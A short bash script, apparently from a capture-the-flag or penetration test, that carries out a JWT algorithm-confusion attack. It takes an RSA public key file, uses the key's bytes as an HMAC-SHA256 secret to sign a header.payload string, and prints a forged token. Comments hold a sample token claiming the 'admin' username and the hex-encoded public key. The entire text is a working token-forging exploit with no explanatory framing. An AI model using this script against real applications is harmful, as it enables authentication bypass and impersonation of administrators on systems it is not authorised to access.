#/bin/bash
#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.CNOKzFwscEkQnDdMnaa846j_c5hYdABhib9j8-5iwwE
#hex : 08d38acc5c2c7049109c374c9da6bce3a8ff73985874006189bf63f3ee62c301
#ascii : 2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541705053627479744153636b336a53526b4c414c550a36567051534968494f72567953434c7579343846437354643669305346672f6843757a5a55733674326d446f3464306831746e686a77567876364b39566f6c520a556c7276434278774c697132305a5278754e51563744724d43416d504348444270784878633236473139744932496f6b375a3768454f4f4878355238506f39790a452f625046436557576731612f4171526c426565474b2b50342b72687a483530325841366e4c7a545a6561714132564959454935387a75534a385a475769397a0a475177336a715238756d704d2b2f4b55567a32522f5162324e36664b6e4972793148535356396e4f33494c7578306c7671465a467a4236664e4d58776b3856760a4962426135306b35336678324a79416c3572673948644c633574467265414b394569337772433267795356646a6a652f79746c6a617a6b43624668737a4742760a52514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
ascii=$(cat $1 | xxd -p | tr -d "\\n")
echo $ascii
hex=$(echo -n "$2" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$ascii)
hex=${hex:9}
echo $hex
jwt=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hex')).replace('=','')\")")

echo "[+]signature: $2.$jwt"
